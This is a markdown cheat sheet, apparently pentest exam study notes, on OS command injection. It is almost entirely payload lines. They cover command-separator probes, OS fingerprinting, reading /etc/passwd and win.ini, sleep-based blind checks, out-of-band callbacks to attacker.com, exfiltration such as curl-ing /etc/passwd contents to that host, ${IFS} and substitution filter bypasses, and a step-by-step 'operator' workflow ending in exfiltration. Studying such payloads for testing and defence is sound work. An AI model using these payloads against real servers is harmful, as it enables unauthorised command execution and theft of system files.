

---

`md
> [!ABSTRACT]
> OS Command Injection occurs when user input is passed into system commands without proper sanitization.  
> This allows attackers to **execute arbitrary OS commands** on the server.  
> 
> It happens when:
> - Input is concatenated into shell commands  
> - The app uses functions like `exec`, `system`, `shell_exec`  
> - No proper filtering/escaping is applied  
> 
> Impact:
> - File read/write  
> - Remote command execution  
> - Full server compromise (depending on privileges)  
> 
> 🧠 Think: “User input → shell → full control”

---



### 🎯 1. Basic Detection (Command Separator)

> [!CHECK]
> Tests if input is executed in a shell  
> Look for command execution or response change  

```bash
; id
````

```bash
&& id
```

```bash
| id
```

---

### 🧪 2. OS Fingerprinting

> [!CHECK]  
> Determines OS type (Linux vs Windows)

```bash
; uname -a
```

```bash
; whoami
```

```bash
& ver
```

```bash
& whoami
```

---

### 🧬 3. Command Execution (Basic)

> [!SUCCESS]  
> Executes arbitrary commands on the system

```bash
; ls
```

```bash
; cat /etc/passwd
```

```bash
& dir
```

```bash
& type C:\Windows\win.ini
```

---

### 🧩 4. Blind Injection (No Output)

> [!CHECK]  
> Used when output is not returned  
> Confirm via delay or external interaction

```bash
; sleep 5
```

```bash
& timeout 5
```

---

### 🧪 5. Out-of-Band (OAST)

> [!SUCCESS]  
> Confirms execution via external request

```bash
; curl http://attacker.com
```

```bash
; wget http://attacker.com
```

```bash
& nslookup attacker.com
```

---

### 💥 6. Data Exfiltration

> [!SUCCESS]  
> Sends sensitive data to attacker

```bash
; curl http://attacker.com/$(whoami)
```

```bash
; curl http://attacker.com/$(cat /etc/passwd)
```

---

### ⚙️ 7. Filter Bypass (Spacing Tricks)

> [!ATTENTION]  
> Bypass filters that block spaces

```bash
;cat${IFS}/etc/passwd
```

```bash
;cat</etc/passwd
```

---

### 🧪 8. Filter Bypass (Command Substitution)

> [!ATTENTION]  
> Executes command inside another

```bash
$(whoami)
```

```bash
`whoami`
```

---

### 💣 9. Command Chaining

> [!SUCCESS]  
> Run multiple commands

```bash
; whoami; id; uname -a
```

```bash
&& whoami && id
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Test injection:
    

```bash
; id
```

2. Confirm execution:
    

```bash
; whoami
```

3. Identify OS:
    

```bash
; uname -a
```

4. If blind:
    

```bash
; sleep 5
```

5. Exfiltrate:
    

```bash
; curl http://attacker.com
```

---

### 🧠 11. Where to Inject

> [!ABSTRACT]
> 
> - URL parameters
>     
> - Form inputs
>     
> - File names
>     
> - HTTP headers
>     
> - API inputs
>     

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
; id
&& id
| id
; whoami
; sleep 5
; curl http://attacker.com
; cat /etc/passwd
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Input sanitized
>     
> - No shell execution
>     
> - Output not reflected
>     

---

> [!ATTENTION]  
> Command injection depends on:
> 
> - Injection point
>     
> - OS type
>     
> - Available binaries
>     
> 
> Always test multiple separators and techniques

---